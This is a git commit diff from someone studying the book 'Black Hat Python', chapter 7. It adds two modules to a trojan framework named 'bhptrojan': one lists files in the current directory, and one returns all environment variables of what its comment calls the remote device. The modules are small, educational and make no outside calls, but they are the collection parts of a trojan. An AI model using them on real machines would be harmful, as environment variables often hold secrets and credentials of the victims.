12abe75c2653840a4f3ab611200c22d93a69f6c2
Relph1119 <huruifeng1202@163.com>
2022-05-25 11:44:37 +0800

    :bento: 第7章学习：添加简单的配置

---
+++ codes/ch07/bhptrojan/modules/dirlister.py
@@ -0,0 +1,16 @@
+#!/usr/bin/env python
+# encoding: utf-8
+"""
+@author: HuRuiFeng
+@file: dirlister.py
+@time: 2022/5/25 11:38
+@project: black-hat-python-2ed
+@desc: P141 遍历文件目录
+"""
+import os
+
+
+def run(**args):
+    print("[*] In dirlister module.")
+    files = os.listdir(".")
+    return str(files)
---
+++ codes/ch07/bhptrojan/modules/environment.py
@@ -0,0 +1,15 @@
+#!/usr/bin/env python
+# encoding: utf-8
+"""
+@author: HuRuiFeng
+@file: environment.py
+@time: 2022/5/25 11:40
+@project: black-hat-python-2ed
+@desc: P142 收集远程设备上设定的所有环境变量
+"""
+import os
+
+
+def run(**args):
+    print("[*] In environment module.")
+    return os.environ
